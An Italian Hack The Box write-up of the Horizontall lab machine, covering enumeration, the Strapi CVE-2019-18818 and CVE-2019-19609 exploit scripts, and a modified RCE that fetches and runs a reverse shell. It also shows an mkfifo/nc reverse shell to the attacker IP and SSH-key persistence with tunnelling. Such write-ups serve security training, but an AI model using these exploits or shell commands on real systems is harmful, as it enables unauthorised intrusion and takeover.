**Target: 10.10.11.105**

# INFORMATION GATHERING

Per prima cosa lanciamo un veloce scan con [Nmap](Note/Tool/Nmap.md)

```bash
┌──(root㉿kali)-[/home/kali]
└─# nmap -sC -sT -sV 10.10.11.105
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-18 08:50 EDT
Nmap scan report for 10.10.11.105
Host is up (0.044s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
|_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: Did not follow redirect to http://horizontall.htb
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.52 seconds
```

Troviamo due porte aperte

- 22 ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 
- 80 http 80/tcp open  http    nginx 1.14.0 (Ubuntu) con quella che sembra essere un nome di dominio
horizontal.htb che andremo ad aggiungere al nostro `etc/host`

Un ulteriore scan su tutte le porte non ci da nessuna informazione aggiuntiva.

# ENUMERATION

## Port 80 

Visitano il sito sulla porta 80 ci troviamo davanti a questa pagina 

![](../zzz_rev/attachments/Horizontall.png)
nessuno dei link sembra funzionare proviamo ad enumerare eventuali directory esposte con [Gobuster](Note/Tool/Gobuster.md)

```bash
┌──(root㉿kali)-[/home/kali]
└─# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://horizontall.htb
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://horizontall.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/09/18 08:56:39 Starting gobuster in directory enumeration mode
===============================================================
/img                  (Status: 301) [Size: 194] [--> http://horizontall.htb/img/]
/css                  (Status: 301) [Size: 194] [--> http://horizontall.htb/css/]
/js                   (Status: 301) [Size: 194] [--> http://horizontall.htb/js/]
Progress: 134778 / 220561 (61.11%)^C
[!] Keyboard interrupt detected, terminating.

===============================================================
2023/09/18 09:08:18 Finished
===============================================================

```

L'enumerazione dell directory  non ci porta da nessuna parte. 

Passiamo ai vhost con WFUZZ

```bash
┌──(root㉿kali)-[/home/kali]
└─# wfuzz -u http://horizontall.htb -H "Host: FUZZ.horizontall.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --hh 194
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://horizontall.htb/
Total requests: 114441

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000001:   200        1 L      43 W       901 Ch      "www"
000047093:   200        19 L     33 W       413 Ch      "api-prod"
```

Possiamo trovare lo stesso sottodominio anche con gobuster 3.5 (utilizzando la flag --Append-domain)

```bash
┌──(root㉿kali)-[/home/kali/htb/horizontall]
└─# gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://horizontall.htb --append-domain
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://horizontall.htb
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:      gobuster/3.5
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
2023/09/22 06:21:04 Starting gobuster in VHOST enumeration mode
===============================================================
Progress: 22169 / 114442 (19.37%)[ERROR] 2023/09/22 06:23:17 [!]
Found: api-prod.horizontall.htb Status: 200 [Size: 413]
```


e anche manualmente, Analizziamo il codice sorgente del sito.
Troviamo due file Javascript a cui punta il sito 
- /js/chunk-vendors.0e02b89e.js
- /js/app.c68eb462.js

Il primo non contiene nulla di interessante, ma nel  /js/app.c68eb462.js abbiamo quello che sembra essere un subdomino
```java
methods: { 
     getReviews: function() 
     { var t = this; 
     r.a.get("http://api-prod.horizontall.htb/reviews").then((function(s) { return t.reviews = s.data })) } }
```

### api-prod.horizontall.htb

Aggiungendolo ad `etc/hosts` possiamo visitarlo e ci troviamo davanti ad una pagina di benvenuto 

![](../zzz_rev/attachments/Horizontall2.png)
Nel file java si faceva riferimento all'endpoint `/reviews`  visitiamolo 

![](..zzz_rev/attachments/Horizontall3.png)

presumo ci siano altri endpoint verifichiamo con feroxbuster

```bash

┌──(root㉿kali)-[/home/kali]
└─# feroxbuster -u http://api-prod.horizontall.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://api-prod.horizontall.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        1l        3w       60c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       19l       33w      413c http://api-prod.horizontall.htb/
200      GET      223l     1051w     9230c http://api-prod.horizontall.htb/admin/runtime~main.d078dc17.js
200      GET       16l      101w      854c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        1l        1w       60c http://api-prod.horizontall.htb/users
200      GET        1l       21w      507c http://api-prod.horizontall.htb/reviews
200      GET        0l        0w  7001634c http://api-prod.horizontall.htb/admin/main.da91597e.chunk.js
200      GET       16l      101w      854c http://api-prod.horizontall.htb/admin
403      GET        1l        1w       60c http://api-prod.horizontall.htb/admin/plugins
200      GET        1l        1w       90c http://api-prod.horizontall.htb/admin/layout
[####################] - 60s    39935/39935   0s      found:8       errors:0
[####################] - 54s    19965/19965   372/s   http://api-prod.horizontall.htb/
[####################] - 59s    19965/19965   337/s   http://api-prod.horizontall.htb/admin/

```

Abbiamo 3 endpoint
- /admin
- /users
- /reviews

Ora /reviews l'abbiamo già visto, vediamo /admin che sembrerebbe quello piu interessante

![](../zzz_rev/attachments/Horizontall4.png)
Ci troivamo davanti una pagina di login di software di nome strapi, vediamo se searchspolit trova qualcosa che possiamo usare

```bash
┌──(root㉿kali)-[/home/kali]
└─# searchsploit strapi
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title  |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Strapi 3.0.0-beta - Set Password (Unauthenticated) multiple/webapps/50237.py
Strapi 3.0.0-beta.17.7 - Remote Code Execution (RCE) (Authenticated) multiple/webapps/50238.py
Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated)|multiple/webapps/50239.py
Strapi CMS 3.0.0-beta.17.4 - Set Password (Unauthenticated) (Metasploit)|nodejs/webapps/50716.rb
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------
```

Abbiamo due cose interessanti, un rest della password senza autenticazione e un RCE con autenticazione.

Scarichiamo Set Password (Unauthenticated) multiple/webapps/50237.py e diamogli un occhio

```bash
┌──(root㉿kali)-[/home/kali/htb/horizontall]
└─# cat 50237.py
# Exploit Title: Strapi 3.0.0-beta - Set Password (Unauthenticated)
# Date: 2021-08-29
# Exploit Author: David Anglada [CodiObert]
# Vendor Homepage: https://strapi.io/
# Version: 3.0.0-beta
# Tested on: Linux
# CVE: CVE-2019-18818

#!/usr/bin/python

import requests
import sys
import json

userEmail = "valid@email.com"
strapiUrl = "http://strapi.url"
newPassword = "codiobert"

s = requests.Session()

# Get strapi version
strapiVersion = json.loads(s.get("{}/admin/strapiVersion".format(strapiUrl)).text)

print("[*] strapi version: {}".format(strapiVersion["strapiVersion"]))

# Validate vulnerable version
if strapiVersion["strapiVersion"].startswith('3.0.0-beta') or strapiVersion["strapiVersion"].startswith('3.0.0-alpha'):
        # Password reset
        print("[*] Password reset for user: {}".format(userEmail))
        resetPasswordReq={"email":userEmail, "url":"{}/admin/plugins/users-permissions/auth/reset-password".format(strapiUrl)}
        s.post("{}/".format(strapiUrl), json=resetPasswordReq)

        # Set new password
        print("[*] Setting new password")
        exploit={"code":{}, "password":newPassword, "passwordConfirmation":newPassword}
        r=s.post("{}/admin/auth/reset-password".format(strapiUrl), json=exploit)

        # Check if the password has changed
        if "username" in str(r.content):
                print("[+] New password '{}' set for user {}".format(newPassword, userEmail))
        else:
                print("\033[91m[-] Something went wrong\033[0m")
                sys.exit(1)
else:
        print("\033[91m[-] This version is not vulnerable\033[0m")
        sys.exit(1)

```

Prima di tutto vediamo se la versione di strapi che abbiamo davanti è quella vulnerabilie

```bash
┌──(root㉿kali)-[/home/kali/htb/horizontall]
└─# curl http://api-prod.horizontall.htb/admin/strapiVersion
{"strapiVersion":"3.0.0-beta.17.4"}

```

Perfetto ci siamo non ci resta che modificare l'exploit inserendo l'url strapi e la nuova password

```bash
┌──(root㉿kali)-[/home/kali/htb/horizontall]
└─# python3 50237.py
[*] strapi version: 3.0.0-beta.17.4
[*] Password reset for user: mysuperemail@gmail.com
[*] Setting new password
[+] New password 'password123' set for user mysuperemail@gmail.com

```

> NB: in realtà la mail non serve in quanto  la prima POST che fa all'endpoint `/admin/plugins/users-permissions/auth/reset-password` non è servito (almeno da quello che ho visto), e l'unica cosa che serve per resettare la password dell'acount admin (admin@horizontall.htb) è una POST all'endpoint `/admin/auth/reset-password`

Ci autentichiamo con le credenziali data all'exploit e siamo dentro

![](../zzz_rev/attachments/Horizontall5.png)

# GAINING AN INITIAL FOOTHOLD

Ora abbiamo due strada da poter percorrere.

Se ci ricordiamo dai risultati di searchsploit avevamo due RCE


- Remote Code Execution (RCE) (Authenticated) multiple/webapps/50238.py
- Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated)|multiple/webapps/50239.py

## RCE AUTENTICATED 50238.py

Analizziamo l'exploit

```python
# Exploit Title: Strapi 3.0.0-beta.17.7 - Remote Code Execution (RCE) (Authenticated)
# Date: 29/08/2021
# Exploit Author: David Utón (M3n0sD0n4ld)
# Vendor Homepage: https://strapi.io/
# Affected Version: strapi-3.0.0-beta.17.7 and earlier
# Tested on: Linux Ubuntu 18.04.5 LTS
# CVE : CVE-2019-19609

#!/usr/bin/python3
# Author: @David_Uton (m3n0sd0n4ld)
# Github: https://m3n0sd0n4ld.github.io
# Usage: python3 CVE-2019-19609.py http[s]//IP[:PORT] TOKEN_JWT COMMAND LHOST

import requests, sys, os, socket

logoType = ('''
=====================================
CVE-2019-19609 - Strapi RCE
-------------------------------------
@David_Uton (M3n0sD0n4ld)
https://m3n0sd0n4ld.github.io/
=====================================
		''')

if __name__ == '__main__':

	# Parameter checking
	if len(sys.argv) != 5:
		print(logoType)
		print("[!] Some of these parameters are missing.")
		print('''
		Use: python3 %s http[s]//IP[:PORT] TOKEN_JWT COMMAND LHOST
		Example: python3 10.10.10.10 eyJHbGCi..... "id" 127.0.0.1''' % sys.argv[0])
	# Exploit run
	else:
		# Paremeters
		url = sys.argv[1]
		token = sys.argv[2]
		command = sys.argv[3]
		lhost = sys.argv[4]
		lport = 9999
		
		s = requests.session()
		
		r = s.post(url, verify=False) # SSL == verify=True
		
		headersData = {
			'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
			'Authorization': "Bearer %s" % token
		}

		postData = {
			"plugin":"documentation && $(%s > /tmp/.m3 && nc %s %s < /tmp/.m3 | rm /tmp/.m3)" % (command, lhost, lport)
		}
		
		print(logoType)
		os.system("nc -nvlp 9999 &")
		try:
			print("[+] Successful operation!!!")
			r = s.post(url + "/admin/plugins/install", headers=headersData, data=postData, verify=False) # SSL == verify=True
			# Content print
			print(r.text)
		except:
			print("[!] An error occurred, try again.")
			sys.exit(1)
```

Allora abbiamo bisogno di un jwtoken che possiamo possiamo trovare `session-storage` dall'ispector
una volta loggati come admin

```┌──(root㉿kali)-[/home/kali/htb/horizontall]
└─# python3 50238.py http://api-prod.horizontall.htb eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjk1Mzc4OTcwLCJleHAiOjE2OTc5NzA5NzB9.GOndrhiKxSzQj9SRQHzkzx_DEYkTxUwGo4ZTfQvm51Q "id" 127.0.0.1
```

lui in automatico di metter in ascolto sulla porta 9999 non ci restituisce una shell.
adiamo a modificare l'exploit

Possiamo vedere che l'RCE è nel questa richiesta postData

```python
postData = {
			"plugin":"documentation && $(%s > /tmp/.m3 && nc %s %s < /tmp/.m3 | rm /tmp/.m3)" % (command, lhost, lport)
```

ipotizando che la macchina target abbia istallato curl proviamo a vedere se  riusciamo a scaricare un file dalla nostra macchia di attacco

prima ci mettiamo in ascolto sulla nostra macchina alla porta 1337

```bash
┌──(root㉿kali)-[/home/kali/tool/shell]
└─# python3 -m http.server 1337
Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
```

modifichiamo la postData come segue  

```python
  postData = {
                        "plugin":"documentation && $(curl http://10.10.14.14:1337/test.py > /tmp/test.py)"
              }          
```

ed eseguiamo 

```bash
┌──(root㉿kali)-[/home/kali/htb/horizontall]
└─# python3 50238.py http://api-prod.horizontall.htb eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjk1Mzc4OTcwLCJleHAiOjE2OTc5NzA5NzB9.GOndrhiKxSzQj9SRQHzkzx_DEYkTxUwGo4ZTfQvm51Q "id" 127.0.0.1
```

Abbiamo la richiesta GET

```bash
┌──(root㉿kali)-[/home/kali/tool/shell]
└─# python3 -m http.server 1337
10.10.11.105 - - [23/Sep/2023 03:16:09] "GET /test.py HTTP/1.1" 200 
```

Perfetto non ci resta che aggiungere allo script un altra postData in qui eseguiamo il nostro script.py che in questa volta sarà un revshell in python  che si conettera alla porta 9999

```python 
     postData = {
                         "plugin":"documentation && $(curl http://10.10.14.14:1337/revshell.py > /tmp/revshell.py)"
                 }

                 postData = {
                         "plugin":"documentation && $(python3 /tmp/revshell.py)"
```

quindi lo script completo sarà il seguente:

```bash
=====================================
CVE-2019-19609 - Strapi RCE
-------------------------------------
@David_Uton (M3n0sD0n4ld)
https://m3n0sd0n4ld.github.io/
  GNU nano 7.2                                                                                                     my50238.py
import requests
import sys

logoType = ('''
=====================================
CVE-2019-19609 - Strapi RCE
-------------------------------------
@David_Uton (M3n0sD0n4ld)
https://m3n0sd0n4ld.github.io/
=====================================
''')

if __name__ == '__main__':
    # Parameter checking
    if len(sys.argv) != 5:
        print(logoType)
        print("[!] Some of these parameters are missing.")
        print('''
        Use: python3 %s http[s]://IP[:PORT] TOKEN_JWT COMMAND LHOST
        Example: python3 10.10.10.10 eyJHbGCi..... "id" 127.0.0.1''' % sys.argv[0])
    # Exploit run
    else:
        # Parameters
        url = sys.argv[1]
        token = sys.argv[2]
        command = sys.argv[3]
        lhost = sys.argv[4]
        lport = 9999

        s = requests.session()

        r = s.post(url, verify=False)  # SSL == verify=True

        headersData = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
            'Authorization': "Bearer %s" % token
        }

        # Prima richiesta POST
        postData1 = {
            "plugin": "documentation && $(curl http://10.10.14.14:1337/revshell.py > /tmp/revshell.py)"
        }

        try:
            print(logoType)
            print("[+] Performing the first operation...")
            r = s.post(url + "/admin/plugins/install", headers=headersData, data=postData1, verify=False)
            print("[+] First operation successful!!!")

            # Seconda richiesta POST
            postData2 = {
                "plugin": "documentation && $(python3 /tmp/revshell.py)"
            }

            print("[+] Performing the second operation...")
            r = s.post(url + "/admin/plugins/install", headers=headersData, data=postData2, verify=False)
            print("[+] Second operation successful!!!")

        except Exception as e:
            print("[!] An error occurred:", str(e))
```

> [!info]
> Ho tolto la parte di avvio automatico di nc perche avviandolo automaticamente la shell che mi restituiva si buggava. 

quindi prima di eseguire l'exploit ci mettiamo in ascolto con nc

```bash
┌──(root㉿kali)-[/home/kali]
└─# nc -lvp 9999
listening on [any] 9999 ..
```

eseguiamo 

```bash
┌──(root㉿kali)-[/home/kali/htb/horizontall]
└─# python3 my50238.py http://api-prod.horizontall.htb eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjk1Mzc4OTcwLCJleHAiOjE2OTc5NzA5NzB9.GOndrhiKxSzQj9SRQHzkzx_DEYkTxUwGo4ZTfQvm51Q "id" 127.0.0.1
```

e abbiamo la nostra shell

```bash
┌──(root㉿kali)-[/home/kali]
└─# nc -lvp 9999
listening on [any] 9999 ...
connect to [10.10.14.14] from horizontall.htb [10.10.11.105] 59768
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1001(strapi) gid=1001(strapi) groups=1001(strapi)
```


## RCE UNAUTHNTICATED 50239.py


Questa RCE si basa sul POC del rest della passwd visto in precendeza,
non fa altro che resettare la password e lasciarci un prompt dei comandi dove noi possiamo andare ad eseguire del codice arbitrario come una revshell

```python
# Exploit Title: Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated)
# Date: 2021-08-30
# Exploit Author: Musyoka Ian
# Vendor Homepage: https://strapi.io/
# Software Link: https://strapi.io/
# Version: Strapi CMS version 3.0.0-beta.17.4 or lower
# Tested on: Ubuntu 20.04
# CVE : CVE-2019-18818, CVE-2019-19609

#!/usr/bin/env python3

import requests
import json
from cmd import Cmd
import sys

if len(sys.argv) != 2:
    print("[-] Wrong number of arguments provided")
    print("[*] Usage: python3 exploit.py <URL>\n")
    sys.exit()


class Terminal(Cmd):
    prompt = "$> "
    def default(self, args):
        code_exec(args)

def check_version():
    global url
    print("[+] Checking Strapi CMS Version running")
    version = requests.get(f"{url}/admin/init").text
    version = json.loads(version)
    version = version["data"]["strapiVersion"]
    if version == "3.0.0-beta.17.4":
        print("[+] Seems like the exploit will work!!!\n[+] Executing exploit\n\n")
    else:
        print("[-] Version mismatch trying the exploit anyway")


def password_reset():
    global url, jwt
    session = requests.session()
    params = {"code" : {"$gt":0},
            "password" : "SuperStrongPassword1",
            "passwordConfirmation" : "SuperStrongPassword1"
            }
    output = session.post(f"{url}/admin/auth/reset-password", json = params).text
    response = json.loads(output)
    jwt = response["jwt"]
    username = response["user"]["username"]
    email = response["user"]["email"]

    if "jwt" not in output:
        print("[-] Password reset unsuccessfull\n[-] Exiting now\n\n")
        sys.exit(1)
    else:
        print(f"[+] Password reset was successfully\n[+] Your email is: {email}\n[+] Your new credentials are: {username}:SuperStrongPassword1\n[+] Your authenticated JSON Web Token: {jwt}\n\n")
def code_exec(cmd):
    global jwt, url
    print("[+] Triggering Remote code executin\n[*] Rember this is a blind RCE don't expect to see output")
    headers = {"Authorization" : f"Bearer {jwt}"}
    data = {"plugin" : f"documentation && $({cmd})",
            "port" : "1337"}
    out = requests.post(f"{url}/admin/plugins/install", json = data, headers = headers)
    print(out.text)
```

prima di eseguire ci mettiamo in ascolto sulla porta 1337 con nc 

```bash
┌──(root㉿kali)-[/home/kali]
└─# nc -lvp 4444
listening on [any] 4444 ...

```

e lanciamo l'exploit

```bash
┌──(root㉿kali)-[/home/kali/htb/horizontall]
└─# python3 50239.py http://api-prod.horizontall.htb
[+] Checking Strapi CMS Version running
[+] Seems like the exploit will work!!!
[+] Executing exploit


[+] Password reset was successfully
[+] Your email is: admin@horizontall.htb
[+] Your new credentials are: admin:SuperStrongPassword1
[+] Your authenticated JSON Web Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjk1NDU0MTQwLCJleHAiOjE2OTgwNDYxNDB9.aOF81CxbwBalIfm-OeVC0gLf_RkJqOMLCTYITS-r0uU


$> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.214 4444 >/tmp/f
```

ora come possiamo vedere resetta la passwd, ci rilascio un token web jons ed è in attesa di un comando.

possiamo fornirgli un rev shell 

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.214 4444 >/tmp/f
```

```bash
┌──(root㉿kali)-[/home/kali/htb/horizontall]
└─# python3 50239.py http://api-prod.horizontall.htb
[+] Checking Strapi CMS Version running
[+] Seems like the exploit will work!!!
[+] Executing exploit


[+] Password reset was successfully
[+] Your email is: admin@horizontall.htb
[+] Your new credentials are: admin:SuperStrongPassword1
[+] Your authenticated JSON Web Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjk1NDU0MTQwLCJleHAiOjE2OTgwNDYxNDB9.aOF81CxbwBalIfm-OeVC0gLf_RkJqOMLCTYITS-r0uU


$> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.214 4444 >/tmp/f
[+] Triggering Remote code executin
[*] Rember this is a blind RCE don't expect to see output
```

otteniamo cosi la nostra shell

```bash
┌──(root㉿kali)-[/home/kali]
└─# nc -lvp 4444
listening on [any] 4444 ...
connect to [10.10.14.14] from horizontall.htb [10.10.11.105] 59324
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1001(strapi) gid=1001(strapi) groups=1001(strapi)
$
```

non ci resta che fare l'upgrade della shell ed passare e prendere la nostra flag

```bash
┌──(root㉿kali)-[/home/kali/htb/horizontall]
└─# nc -lvp 9999
listening on [any] 9999 ...
connect to [10.10.14.14] from horizontall.htb [10.10.11.105] 60062
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
strapi@horizontall:~/myapi$ ^Z
zsh: suspended  nc -lvp 9999

┌──(root㉿kali)-[/home/kali/htb/horizontall]
└─# stty raw -echo; fg
[1]  + continued  nc -lvp 9999

strapi@horizontall:~/myapi$ export SHELL=bash
strapi@horizontall:~/myapi$ export TERM=xterm-256color
```

flag user

```bash
strapi@horizontall:/home/developer$ cat user.txt
98096953149edb50733725a42742865b
```

# PRIVESC

Vediamo quali connesioni di rete sono presenti sulla macchina con netstat

Il comando `netstat -tnlp` è un comando di sistema utilizzato per visualizzare una lista delle connessioni di rete attive e delle porte in ascolto sul tuo sistema. Ecco cosa significano le opzioni utilizzate nel comando:

- `-t`: Visualizza le connessioni TCP.
- `-n`: Visualizza gli indirizzi IP e i numeri di porta in formato numerico anziché cercare di risolverli in nomi di host e servizi.
- `-l`: Mostra solo le porte in ascolto.
- `-p`: Mostra il processo (programma) associato alle porte.

```bash
strapi@horizontall:~/myapi$ netstat -tnlp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:1337          0.0.0.0:*               LISTEN      1755/node /usr/bin/
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
strapi@horizontall:~/myapi$
```

  
Guardando il netstat, c'è il sito su 80 e un lato NodeJS su 1337. C'è anche MySQL su 3306 (il che ha senso). Ma c'è anche qualcosa su 8000: vediamo di cosa si tratta

```bash
strapi@horizontall:~$ curl -I 127.0.0.1:8000
HTTP/1.1 200 OK
Host: 127.0.0.1:8000
Date: Sun, 24 Sep 2023 11:08:45 GMT
Connection: close
X-Powered-By: PHP/7.4.22
Content-Type: text/html; charset=UTF-8
Cache-Control: no-cache, private
Date: Sun, 24 Sep 2023 11:08:45 GMT
Set-Cookie: XSRF-TOKEN=eyJpdiI6IlZxTmd2SGtnM0xES1lnbTd1QTR4eHc9PSIsInZhbHVlIjoiYU5FMTJsK1NkTG85NmVSYTVDd0FZc3hWSnRzbml0SDFaSlhGWlQ3YTZsWEJoRWphZk0xcXgxckNINDJnM0N3S2NRNldKTjJFYjJ5bzRqd1U1Z0RkdGt0bSt0dytBYzcvcjBOZEE2WEVrMmJNQytsbVB4MnJPdkFnbys4d3l3eXEiLCJtYWMiOiI0MzhiZTJlZWI2MGE2Mjc2OTMyZGYwNjVjOTg3NWFlYzI1ZjZlZGEzM2I2MDNjZDI0M2NmZWZjYmJiYWE0N2UwIn0%3D; expires=Sun, 24-Sep-2023 13:08:45 GMT; Max-Age=7200; path=/; samesite=lax
Set-Cookie: laravel_session=eyJpdiI6Ikl2M3JNUUc3N3l3eTA3YjJBMjZxa3c9PSIsInZhbHVlIjoiQUt1dklzdUtOcVNieENLeXFmLzdNUEF4VkFFbE1JbHpvclo3d2VlYlVtdVZ5MW1TTmwrcFl4ZHE0Q2YxVnQybTd1RDFHT1p2cmVnMXZxYzIzb0FFaEtoNkRGQVI3b013Vzc4SXYwTWRHN1kzTTZRNUM0L3ErSFdsTW9Qb1daVmYiLCJtYWMiOiI5ZmQ0ODVmYjM3ZWU1YzBiY2M5MjBkNjUyNGI5M2Q5YmU3NTkxMzQ1NTFhNTYwOGM5MjcwMTQzODE1Y2JiMTJkIn0%3D; expires=Sun, 24-Sep-2023 13:08:45 GMT; Max-Age=7200; path=/; httponly; samesite=lax
```

in base alla risposta e ai cookie, sembra Laravel, un framework PHP.

Visto che siamo utenti strapi dovremmo aver accesso a .ssh/authorized_keys
questo ci consentirebbe di inserire una nostra chiave pubblica generata con `ssh-keygen` per poi collegarci in ssh e creare un tunnel ssh per raggiungere la porta 8000 dalla nostra macchina 

Quindi per prima cosa vediamo se abbiamo i permessi di scrittura sul file  `autorized_keys`

```bash
strapi@horizontall:~/.ssh$ ls -la
total 12
drwxrwxr-x  2 strapi strapi 4096 Sep 24 11:07 .
drwxr-xr-x 10 strapi strapi 4096 Sep 22 15:44 ..
-rw-rw-r--  1 strapi strapi  581 Sep 24 11:07 authorized_keys
```

Perfetto abbiamo i permessi di scrittura, generiamo la coppia di chiavi pubblica/privata con `ssh-keygen` 

```bash
┌──(root㉿kali)-[/home/kali/htb/horizontall]
└─# ssh-keygen -t rsa
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): id_rsa
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in id_rsa
Your public key has been saved in id_rsa.pub
The key fingerprint is:
SHA256:mBcPgCXFc42e5+OHMwZwn2JfpZkj0AFQtnfe3XFp6tA root@kali
The key's randomart image is:
+---[RSA 3072]----+
|    .==o++       |
|    ..ooo.o     .|
|       ++o...  +.|
|      .o==oo..+.+|
|      ooS=.o.E. o|
|       .+ * O    |
|       . = = o   |
|          B .    |
|         . +     |
+----[SHA256]-----+
```

Inseriamo nel file `autorized_keys`  la chiave pubblica id_rsa.pub generata 

```bash
strapi@horizontall:~/.ssh$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDNlrvFM3igURAYTb1g3Of9DKK8DNs+qzQpd0esoqdx/Dy43PH0kibXeHflt9LowZ7PZzHd6gZPPMjyw1UGcWCyWPNJUOvxL8FMhrRF9EwaZ8nqFt/9wFou93hYzZ56TWQ0HQCcRQCBW1x92QbA+KcwCSCotUYILaVRNdRymK5QiUKJxqIIEWsfJlaJOqVeWjKuS84+tvMaT9RUBnil+pqNdtEvOOpwDVouNGTXY8cL+ZH0cJGJZZECrnbuETigl2gGOCLSbo2bWdLXnEow/rIegEq0jt4qAxTHpFpAUB9wK1WPsYCJPn4Kryd6znhYh3C3BM9uJygVOq0PmVSz1uBic6e4+bDmZcMV7XCbxgPtxBWY0GKHUUa581LY8Om8w1iyhlf7xaQIREPHmSPsMiCJV1CEZZS+fmOuG/whYOoowmZiySnNwX3by6eEB8yiTWctHiWjdh05v/2BXv8/xCP1fUvckgv9UUscaTL+bispdvOndB0ss5+UOPPt6z4Snw0= root@kali" >> authorized_keys

```

e utilizziamo ssh per create un tunnel alla porta 8000

```bash
┌──(root㉿kali)-[/home/kali/htb/horizontall]
└─# ssh -i id_rsa strapi@10.10.11.105 -L 8000:localhost:8000
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-154-generic x86_64)

 * Documentation:  https://help.ubuntu.com
